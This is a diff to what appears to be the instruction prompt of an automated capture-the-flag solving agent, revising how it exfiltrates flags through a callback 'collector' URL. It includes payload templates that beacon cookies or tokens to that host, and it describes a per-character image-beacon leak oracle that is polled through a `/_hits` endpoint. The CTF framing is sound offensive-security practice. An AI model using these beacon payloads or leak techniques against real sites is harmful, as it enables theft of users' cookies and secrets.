@@ -133,23 +133,38 @@ based on what's available — in this priority order:
 1. PREFERRED: read `COLLECTOR_URL` from env (it is already exported
    for you — `<user's tunnel>/api/collector/<job_id>` — whenever
    Settings has a Callback URL configured; you do NOT need to
-   reconstruct it from `CALLBACK_URL`). The collector is WRITE-ONLY:
-   it accepts the value the caller sends and replies `ok` — nothing
-   more. There is no read-back: it has no `/dump`, `/all`, `/hits`,
-   `/log` view, and `GET ${COLLECTOR_URL}` returns the same `ok`.
-   Do not hunt for a read endpoint, query `/api/jobs/...`, or stand
-   up a second channel (webhook.site etc.) to fetch the value back —
-   the value never returns to your script by design. Instead, the
-   orchestrator extracts any flag the caller sent SERVER-SIDE and
-   marks the job `finished`/success on its own. So the whole job of
-   your script is: embed
-       `${COLLECTOR_URL}?c=$flag`
-   in the payload, fire it, and exit. You will NOT see the captured
-   value yourself, and you do NOT print `FLAG_CANDIDATE` for an
-   out-of-band capture — `FLAG_CANDIDATE` is only for a flag your
-   script reads directly in-band (e.g. straight out of an HTTP
-   response). A server-side collector capture counts as success
-   without any `FLAG_CANDIDATE` line.
+   reconstruct it from `CALLBACK_URL`). A request to `${COLLECTOR_URL}`
+   with any path/query is logged as a beacon and replies `ok`. Pick the
+   channel by WHAT you are leaking:
+
+   • SINGLE-SHOT — the whole value arrives in ONE beacon (a cookie, a
+     flag read by the caller, a single token). Embed
+         `${COLLECTOR_URL}?c=<value>`
+     in the payload, fire it, and EXIT. The orchestrator extracts any
+     flag SERVER-SIDE and marks the job finished; the value never comes
+     back to your script, so do NOT poll, do NOT hunt for a read
+     endpoint or query `/api/jobs/...`, do NOT stand up a webhook.site
+     second channel, and do NOT print `FLAG_CANDIDATE` (an out-of-band
+     capture is success without it — `FLAG_CANDIDATE` is only for a flag
+     your script reads directly in-band). This is the common case.
+
+   • ITERATIVE ORACLE — you recover the flag one char (or bit) per round
+     and must learn which conditional beacon fired to extend the next
+     round (a CSP-constrained boolean / LIKE-search leak: each candidate
+     loads a unique `${COLLECTOR_URL}?pos=N&c=X` image only when it
+     matches, and one bot visit can test a packed `width=1 height=1`
+     viewport of candidates at once). For THIS pattern there IS a
+     read-back:
+         `GET ${COLLECTOR_URL}/_hits`  →  JSON
+         {"count":N, "hits":[{ts,method,path,query,ua}, ...]}
+     listing the beacons received so far (the poll itself is NOT logged;
+     `?since=<n>` returns only hits at/after index n). The bot visit is
+     ASYNC — after you trigger it, POLL `/_hits` until the round's
+     marker appears or a short timeout, read which `c=X` arrived, extend
+     your prefix, and fire the next round. Reconstruct the flag yourself
+     across rounds and DO print `FLAG_CANDIDATE: <flag>` (you read it
+     in-band via `/_hits`). This is a stable, un-rate-limited read
+     channel — prefer it over webhook.site for any per-round leak.
 
    Fallback: read `CALLBACK_URL` directly (operator may have set a
    webhook.site-style URL).
